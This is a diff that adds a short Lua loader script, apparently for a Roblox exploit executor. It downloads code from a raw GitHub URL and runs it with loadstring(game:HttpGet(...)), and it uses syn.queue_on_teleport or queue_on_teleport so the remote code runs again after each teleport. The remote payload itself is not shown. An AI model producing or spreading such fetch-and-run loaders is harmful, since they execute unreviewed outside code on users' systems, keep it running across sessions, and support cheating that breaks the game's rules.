@@ -1,0 +1,12 @@
+local scriptURL = "https://raw.githubusercontent.com/wyaSwift/d3d3/refs/heads/main/f"
+
+-- Queue the script on teleport
+if syn and syn.queue_on_teleport then
+    syn.queue_on_teleport('loadstring(game:HttpGet("' .. scriptURL .. '"))()')
+elseif queue_on_teleport then
+    queue_on_teleport('loadstring(game:HttpGet("' .. scriptURL .. '"))()')
+else
+end
+
+-- Optionally, run it now
+loadstring(game:HttpGet(scriptURL))()
